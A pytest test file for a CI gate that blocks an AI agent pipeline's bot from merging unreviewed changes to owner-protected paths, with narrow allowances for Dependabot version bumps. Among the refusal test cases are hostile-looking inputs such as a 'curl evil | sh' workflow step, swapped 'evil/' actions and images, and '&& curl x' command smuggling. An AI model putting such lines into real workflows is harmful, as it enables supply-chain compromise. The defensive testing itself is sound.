"""An agent must not be able to merge a change to an owned path unreviewed (#1397).

This gate is the enforced owner review on `main` (owner ruling, 2026-11-12): its scope is every
path `.github/CODEOWNERS` lists, plus the gate itself, and it replaces GitHub's code-owner review.
Automating the deploy (#1398) is what makes it load-bearing: without it an agent could rewrite
`scripts/agent-pipeline/**`, merge it unattended, and have it running with the owner's credentials
minutes later.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))

from pipeline_selfmod_gate import (  # noqa: E402
    CODEOWNERS,
    PROTECTED,
    CodeownersUnreadable,
    codeowners_regex,
    decide,
    dependabot_bump,
    diff_paths,
    load_codeowners,
    main,
    touches_protected,
)

OWNER = "gitchrisqueen"
BOT = "cqc-lem-agent-pipeline[bot]"


# ---------------------------------------------------------------- what counts as protected


@pytest.mark.parametrize("path", [
    "scripts/agent-pipeline/tick.sh",
    "scripts/agent-pipeline/v2/lemd/observe.py",
    "scripts/agent-pipeline/v2/actions/agent_run.sh",
    ".github/workflows/deploy-vps.yml",
    ".github/CODEOWNERS",
    "scripts/pipeline_selfmod_gate.py",
    "tests/unit/test_pipeline_selfmod_gate.py",
])
def test_the_machinery_and_its_credentials_are_protected(path):
    """The pipeline's own code, and the workflows that hold the secrets it would use."""
    assert touches_protected([path]) == [path]


@pytest.mark.parametrize("path", [
    "src/cqc_lem/app/engagement/feed.py",
    "docs/agent-pipeline-v2.md",
    "tests/unit/test_agent_pipeline_v2_observe.py",
    "README.md",
    "poetry.lock",
    "pyproject.toml",
    "src/cqc_lem/ui/package.json",
])
def test_ordinary_changes_are_not_protected(path):
    """Deliberately narrow. A gate that fires on everything is one people route around.

    Note the doc and the pipeline's TESTS are not protected: they cannot change what the runner
    does. Only the code it executes can. Lockfiles and manifests stay out too: Dependabot bumps
    them every week, and CODEOWNERS does not list them.
    """
    assert touches_protected([path]) == []


# ---------------------------------------------------------------- the verdict


def test_an_untouched_pr_passes_without_review():
    """The overwhelming majority of PRs, which this must not slow down."""
    got = decide(changed=["src/cqc_lem/app/engagement/feed.py"], author=BOT, approvers=[],
                 owner=OWNER)
    assert got.allowed


def test_the_bot_cannot_merge_a_pipeline_change_unreviewed():
    """The whole point."""
    got = decide(changed=["scripts/agent-pipeline/v2/lemd/observe.py"],
                 author=BOT, approvers=[], owner=OWNER)
    assert not got.allowed
    assert "no approving review" in got.reason


def test_the_bot_may_merge_a_pipeline_change_the_owner_approved():
    """The gate asks for a human, not for the work to stop."""
    got = decide(changed=["scripts/agent-pipeline/v2/lemd/observe.py"],
                 author=BOT, approvers=[OWNER], owner=OWNER)
    assert got.allowed


def test_an_approval_from_anyone_else_is_not_enough():
    """Only the owner's approval counts; the allowlist is one name for a reason."""
    got = decide(changed=["scripts/agent-pipeline/tick.sh"],
                 author=BOT, approvers=["some-contributor"], owner=OWNER)
    assert not got.allowed


def test_the_owner_is_exempt_from_their_own_gate():
    """The threat is the bot's identity acting unattended, not the owner acting under their own.

    Single-human-maintainer repo (#1692): the owner already holds every credential and control
    surface a merge could reach, and there is no second person to demand a review from. Revisit
    the day a second human maintainer joins.
    """
    got = decide(changed=["scripts/agent-pipeline/v2/lemd/daemon.py"],
                 author=OWNER, approvers=[], owner=OWNER)
    assert got.allowed
    assert "sole human maintainer" in got.reason


def test_a_workflow_change_by_the_owner_is_exempt_too():
    """Workflows hold the credentials, but the owner already holds those credentials directly."""
    got = decide(changed=[".github/workflows/build-and-push.yml"],
                 author=OWNER, approvers=[], owner=OWNER)
    assert got.allowed


def test_a_mixed_pr_is_gated_on_its_protected_half():
    """One protected file is enough; the rest of the diff does not dilute it."""
    got = decide(changed=["README.md", "scripts/agent-pipeline/install.sh", "src/x.py"],
                 author=BOT, approvers=[], owner=OWNER)
    assert not got.allowed


def test_the_refusal_names_what_to_do_about_it():
    """A refusal that does not say what it wants gets worked around rather than satisfied."""
    got = decide(changed=["scripts/agent-pipeline/tick.sh"], author=BOT, approvers=[], owner=OWNER)
    assert OWNER in got.reason
    assert "scripts/agent-pipeline/tick.sh" in got.reason


# ---------------------------------------------------------------- the CLI


def _run(changed, author, approvers):
    """Invoke the gate the way CI does."""
    return subprocess.run(
        [sys.executable, str(_ROOT / "scripts" / "pipeline_selfmod_gate.py"),
         "--changed", json.dumps(changed), "--author", author,
         "--approvers", json.dumps(approvers), "--owner", OWNER],
        capture_output=True, text=True, timeout=30,
    )


def test_the_cli_exits_non_zero_on_a_refusal():
    """CI reads the exit code; anything else is advisory."""
    got = _run(["scripts/agent-pipeline/tick.sh"], BOT, [])
    assert got.returncode == 1
    assert "REFUSED" in got.stdout
    assert "::error title=Pipeline self-modification::" in got.stdout


def test_the_cli_exits_zero_when_allowed():
    """And must not fail the ordinary case."""
    got = _run(["src/cqc_lem/app/engagement/feed.py"], BOT, [])
    assert got.returncode == 0
    assert "PASS" in got.stdout


def test_main_is_importable_and_returns_the_code():
    """Kept callable in-process so the logic is testable without a subprocess."""
    rc = main(["gate", "--changed", json.dumps(["scripts/agent-pipeline/x.sh"]),
               "--author", BOT, "--approvers", "[]", "--owner", OWNER])
    assert rc == 1


def test_the_protected_list_is_not_silently_empty():
    """An empty list would make the gate pass everything while looking installed."""
    assert PROTECTED
    assert any("agent-pipeline" in p for p in PROTECTED)
    assert any("workflows" in p for p in PROTECTED)


# ---------------------------------------------------------------- the Dependabot action-ref allowance

DEPENDABOT = "dependabot[bot]"
CI = ".github/workflows/ci.yml"


def _diff(path: str, *pairs: tuple[str, str], context: str = "    steps:") -> str:
    """A unified diff of `path` replacing each (old, new) line pair."""
    body = [f"diff --git a/{path} b/{path}", "index 1111111..2222222 100644",
            f"--- a/{path}", f"+++ b/{path}", "@@ -10,4 +10,4 @@ jobs:", f" {context}"]
    for old, new in pairs:
        body += [f"-{old}", f"+{new}"]
    return "\n".join(body) + "\n"


CHECKOUT = ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5")
PINNED = ("        uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0",
          "        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0")


def _gate(changed, diff, author=DEPENDABOT, approvers=()):
    return decide(changed=changed, author=author, approvers=list(approvers), owner=OWNER, diff=diff)


def test_dependabot_moving_action_refs_in_workflows_is_allowed():
    got = _gate([CI], _diff(CI, CHECKOUT, PINNED))
    assert got.allowed
    assert "Dependabot" in got.reason


def test_the_allowance_covers_several_workflow_files():
    other = ".github/workflows/deploy.yml"
    got = _gate([CI, other], _diff(CI, CHECKOUT) + _diff(other, PINNED))
    assert got.allowed


@pytest.mark.parametrize("author", [BOT, "some-contributor", "dependabot"])
def test_only_dependabot_gets_the_allowance(author):
    """The pipeline's own App may not ride it, nor a user squatting the bare `dependabot` name."""
    assert not _gate([CI], _diff(CI, CHECKOUT), author=author).allowed


def test_no_diff_keeps_todays_refusal():
    assert not _gate([CI], None).allowed
    assert not _gate([CI], "").allowed


def test_a_non_workflow_file_in_the_pr_refuses():
    path = "scripts/agent-pipeline/tick.sh"
    got = _gate([CI, path], _diff(CI, CHECKOUT) + _diff(path, CHECKOUT))
    assert not got.allowed


@pytest.mark.parametrize("pair", [
    ("        run: echo hi", "        run: curl evil | sh"),                      # not a uses: line
    ("      - uses: actions/checkout@v4", "      - uses: evil/checkout@v4"),     # action swapped
    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v4"),  # ref unchanged
    ("      - uses: actions/checkout@v4", "  - uses: actions/checkout@v5"),      # re-indented
    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5 && x"),
    ("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v5#x"),
    ("      - uses: actions/checkout@v4", "      - uses: docker://alpine@sha256"),
])
def test_anything_but_a_ref_move_refuses(pair):
    assert not _gate([CI], _diff(CI, pair)).allowed


def test_an_added_line_without_a_removed_one_refuses():
    """A new step is not a bump, even when it is a `uses:` line."""
    diff = _diff(CI) + "+      - uses: evil/action@v1\n"
    assert not _gate([CI], diff).allowed


def test_a_diff_naming_a_file_the_pr_does_not_list_refuses():
    other = ".github/workflows/deploy.yml"
    assert not _gate([CI], _diff(CI, CHECKOUT) + _diff(other, CHECKOUT)).allowed
    assert not _gate([CI, other], _diff(CI, CHECKOUT)).allowed


@pytest.mark.parametrize("header", ["new file mode 100644", "deleted file mode 100644",
                                    "rename from .github/workflows/a.yml", "old mode 100644"])
def test_structural_changes_refuse(header):
    diff = _diff(CI, CHECKOUT).replace("index 1111111", f"{header}\nindex 1111111")
    assert not _gate([CI], diff).allowed


def test_a_rename_across_paths_refuses():
    diff = _diff(CI, CHECKOUT).replace(f"b/{CI}", "b/.github/workflows/other.yml", 1)
    assert not _gate([CI], diff).allowed


def test_a_diff_with_no_change_lines_refuses():
    assert not _gate([CI], _diff(CI)).allowed


def test_a_trusted_answer_login_never_counts_as_the_owner():
    """LEMD_TRUSTED_ANSWER_LOGINS answers park questions; it is never this gate's approver."""
    got = decide(changed=["scripts/agent-pipeline/tick.sh"], author=BOT,
                 approvers=["owner-second-login"], owner=OWNER)
    assert not got.allowed


def test_the_cli_passes_the_diff_through():
    args = ["gate", "--changed", json.dumps([CI]), "--author", DEPENDABOT, "--approvers", "[]",
            "--owner", OWNER]
    assert main([*args, "--diff", _diff(CI, CHECKOUT)]) == 0
    assert main(args) == 1


def test_the_cli_reads_the_diff_from_a_file_path(tmp_path):
    """The workflow passes `--diff <path>`: a real PR diff can exceed the argument-length limit."""
    args = ["gate", "--changed", json.dumps([CI]), "--author", DEPENDABOT, "--approvers", "[]",
            "--owner", OWNER]
    diff_file = tmp_path / "pr.diff"
    diff_file.write_text(_diff(CI, CHECKOUT), encoding="utf-8")
    assert main([*args, "--diff", str(diff_file)]) == 0
    assert main([*args, "--diff", str(tmp_path / "missing.diff")]) == 1


# ---------------------------------------------------------------- scope = CODEOWNERS


@pytest.mark.parametrize("path", [
    "src/cqc_lem/api/main.py",
    "src/cqc_lem/utilities/crypto.py",
    "compose/local/database/migrations/V20261112000000__x.sql",
    "compose/local/Dockerfile",
    "docker-compose.yml",
    "docker-compose.prod.yml",
    ".github/dependabot.yml",
    ".github/actions/setup/action.yml",
    ".litellm/config.yaml",
    "scripts/deploy.sh",
    "scripts/systemd/lem.service",
    "scripts/triage_issues.py",
])
def test_every_codeowners_path_is_in_scope(path):
    """The gate replaces code-owner review, so it must cover what code-owner review covered."""
    assert touches_protected([path]) == [path]


def test_every_live_codeowners_rule_reaches_the_gate():
    """Each rule in the real file protects the path it names (or something inside a directory)."""
    patterns = load_codeowners()
    assert len(patterns) > 20
    for pattern in patterns:
        probe = pattern.strip("/") + ("/probe" if pattern.endswith("/") else "")
        assert touches_protected([probe], patterns) == [probe], pattern


@pytest.mark.parametrize(("pattern", "path", "hit"), [
    ("/docs/", "docs/a.md", True),
    ("/docs/", "docs", False),                    # a trailing `/` owns what is INSIDE
    ("/docs/", "src/docs/a.md", False),           # a leading `/` anchors at the root
    ("docs/", "src/docs/a.md", True),             # unanchored: any depth
    ("/scripts/deploy.sh", "scripts/deploy.sh", True),
    ("/scripts/deploy.sh", "scripts/deploy.sh.bak", False),
    ("/scripts/deploy.sh", "x/scripts/deploy.sh", False),
    ("/build", "build/out/x.js", True),           # no trailing `/`: the path or anything under it
    ("*.sql", "a/b/V1__x.sql", True),
    ("/a/*.sql", "a/b/V1__x.sql", False),         # `*` stays inside one segment
    ("/a/**/x.sql", "a/b/c/x.sql", True),
    ("/a/**/x.sql", "a/x.sql", True),
    ("a/b", "z/a/b", False),                      # a middle `/` anchors too
    ("Dockerfile", "compose/local/Dockerfile", True),
])
def test_codeowners_patterns_follow_gitignore_rules(pattern, path, hit):
    assert bool(codeowners_regex(pattern).fullmatch(path)) is hit


def test_a_codeowners_change_cannot_drop_the_gate_itself():
    """`PROTECTED` holds the gate's own files, so a CODEOWNERS that forgets them changes nothing."""
    got = decide(changed=["scripts/pipeline_selfmod_gate.py"], author=BOT, approvers=[],
                 owner=OWNER, codeowners=["/README.md"])
    assert not got.allowed


def test_scope_comes_from_the_codeowners_passed_in():
    assert not decide(changed=["x/y.py"], author=BOT, approvers=[], owner=OWNER,
                      codeowners=["/x/"]).allowed
    assert decide(changed=["x/y.py"], author=BOT, approvers=[], owner=OWNER,
                  codeowners=["/z/"]).allowed


def test_the_default_codeowners_is_the_one_beside_the_script():
    """The workflow checks out the BASE commit, so this is the base branch's copy."""
    assert CODEOWNERS == _ROOT / ".github" / "CODEOWNERS"


# ---------------------------------------------------------------- CODEOWNERS unreadable fails closed


def test_a_missing_codeowners_refuses_every_author(tmp_path):
    missing = tmp_path / "CODEOWNERS"
    with pytest.raises(CodeownersUnreadable):
        load_codeowners(missing)
    for author in (BOT, OWNER, "dependabot[bot]"):
        rc = main(["gate", "--changed", json.dumps(["README.md"]), "--author", author,
                   "--approvers", json.dumps([OWNER]), "--owner", OWNER,
                   "--codeowners", str(missing)])
        assert rc == 1, author


def test_a_codeowners_with_no_rule_refuses(tmp_path):
    empty = tmp_path / "CODEOWNERS"
    empty.write_text("# only comments\n\n", encoding="utf-8")
    with pytest.raises(CodeownersUnreadable):
        load_codeowners(empty)


def test_an_undecodable_codeowners_refuses(tmp_path):
    bad = tmp_path / "CODEOWNERS"
    bad.write_bytes(b"\xff\xfe\x00bad")
    with pytest.raises(CodeownersUnreadable):
        load_codeowners(bad)


def test_decide_refuses_when_it_has_to_read_an_unreadable_file(monkeypatch, tmp_path):
    import pipeline_selfmod_gate as gate

    monkeypatch.setattr(gate, "CODEOWNERS", tmp_path / "gone")
    got = decide(changed=["README.md"], author=OWNER, approvers=[], owner=OWNER)
    assert not got.allowed
    assert "CODEOWNERS" in got.reason


def test_the_cli_reports_the_unreadable_file(tmp_path, capsys):
    rc = main(["gate", "--changed", "[]", "--author", BOT, "--approvers", "[]",
               "--codeowners", str(tmp_path / "gone")])
    out = capsys.readouterr().out
    assert rc == 1
    assert "REFUSED" in out and "restore .github/CODEOWNERS" in out


# ---------------------------------------------------------------- renames are judged at both ends


def test_a_rename_out_of_an_owned_path_is_owned():
    """Moving a protected file away deletes it from its protected home."""
    diff = ("diff --git a/scripts/deploy.sh b/docs/deploy.sh\nsimilarity index 100%\n"
            "rename from scripts/deploy.sh\nrename to docs/deploy.sh\n")
    got = decide(changed=["docs/deploy.sh"], author=BOT, approvers=[], owner=OWNER, diff=diff)
    assert not got.allowed
    assert "scripts/deploy.sh" in got.reason


def test_diff_paths_reads_both_ends():
    diff = "diff --git a/a.py b/b.py\nrename from a.py\nrename to b.py\n"
    assert diff_paths(diff) == ["a.py", "b.py"]
    assert diff_paths(None) == []


# ---------------------------------------------------------------- the Dependabot Docker allowance

DOCKERFILE = "compose/local/Dockerfile"
COMPOSE = "docker-compose.yml"
SHA_A = "a" * 64
SHA_B = "b" * 64


@pytest.mark.parametrize(("path", "pair"), [
    (DOCKERFILE, ("FROM python:3.12-slim", "FROM python:3.13-slim")),
    (DOCKERFILE, ("FROM python:3.12-slim AS base", "FROM python:3.13-slim AS base")),
    (DOCKERFILE, (f"FROM python@sha256:{SHA_A}", f"FROM python@sha256:{SHA_B}")),
    (DOCKERFILE, (f"FROM python:3.12@sha256:{SHA_A}", f"FROM python:3.13@sha256:{SHA_B}")),
    (DOCKERFILE, ("FROM --platform=linux/amd64 node:20", "FROM --platform=linux/amd64 node:22")),
    (DOCKERFILE, ("FROM ghcr.io/org/img:1.0", "FROM ghcr.io/org/img:1.1")),
    (DOCKERFILE, ("FROM reg.local:5000/img:1.0", "FROM reg.local:5000/img:1.1")),
    (COMPOSE, ("    image: redis:7.2", "    image: redis:7.4")),
    (COMPOSE, ('    image: "mysql:8.0"', '    image: "mysql:8.4"')),
    (COMPOSE, ("    image: selenium/standalone-chrome:130.0  # pinned",
               "    image: selenium/standalone-chrome:131.0  # pinned")),
    ("docker-compose.prod.yml", ("    image: redis:7.2", "    image: redis:7.4")),
])
def test_dependabot_moving_an_image_tag_is_allowed(path, pair):
    got = _gate([path], _diff(path, pair))
    assert got.allowed, got.reason
    assert "Dependabot" in got.reason


@pytest.mark.parametrize(("path", "pair"), [
    (DOCKERFILE, ("FROM python:3.12-slim", "FROM evil/python:3.12-slim")),        # image swapped
    (DOCKERFILE, ("FROM python:3.12-slim", "FROM python:3.12-slim")),             # nothing moved
    (DOCKERFILE, ("FROM python:3.12 AS base", "FROM python:3.13 AS other")),      # stage renamed
    (DOCKERFILE, ("FROM python:3.12", "FROM ${BASE}")),                           # variable
    (DOCKERFILE, ("FROM python:3.12", "FROM python:3.13 && curl x")),
    (DOCKERFILE, ("RUN pip install x==1", "RUN pip install x==2")),               # not a FROM
    (DOCKERFILE, ("FROM python:3.12", "  FROM python:3.13")),                     # re-indented
    (COMPOSE, ("    image: redis:7.2", "    image: evil:7.2")),
    (COMPOSE, ("    image: redis:7.2", "    command: redis:7.4")),
    (COMPOSE, ("    image: redis:7.2", "      image: redis:7.4")),
    (COMPOSE, ("    image: redis:7.2", "    image: ${REDIS_IMAGE}")),
    (COMPOSE, ("    environment: A=1", "    environment: A=2")),
])
def test_anything_but_an_image_version_move_refuses(path, pair):
    assert not _gate([path], _diff(path, pair)).allowed


def test_the_docker_allowance_is_dependabot_only():
    pair = ("FROM python:3.12", "FROM python:3.13")
    assert not _gate([DOCKERFILE], _diff(DOCKERFILE, pair), author=BOT).allowed


def test_a_uses_line_in_a_dockerfile_does_not_ride_the_workflow_rule():
    """Each file kind has ONE allowed line shape."""
    assert not _gate([DOCKERFILE], _diff(DOCKERFILE, CHECKOUT)).allowed
    assert not _gate([CI], _diff(CI, ("FROM python:3.12", "FROM python:3.13"))).allowed


def test_a_docker_bump_plus_another_owned_file_refuses():
    pair = ("FROM python:3.12", "FROM python:3.13")
    path = "scripts/deploy.sh"
    assert not _gate([DOCKERFILE, path], _diff(DOCKERFILE, pair) + _diff(path, pair)).allowed


def test_dependabot_bump_needs_a_known_file_kind():
    assert not dependabot_bump(["Makefile"], _diff("Makefile", ("a", "b")))
    assert not dependabot_bump([DOCKERFILE], "garbage before any header\n")


def test_dependabot_on_unowned_paths_is_allowed_as_today():
    got = _gate(["poetry.lock", "pyproject.toml"], None)
    assert got.allowed
    assert "no owned path" in got.reason
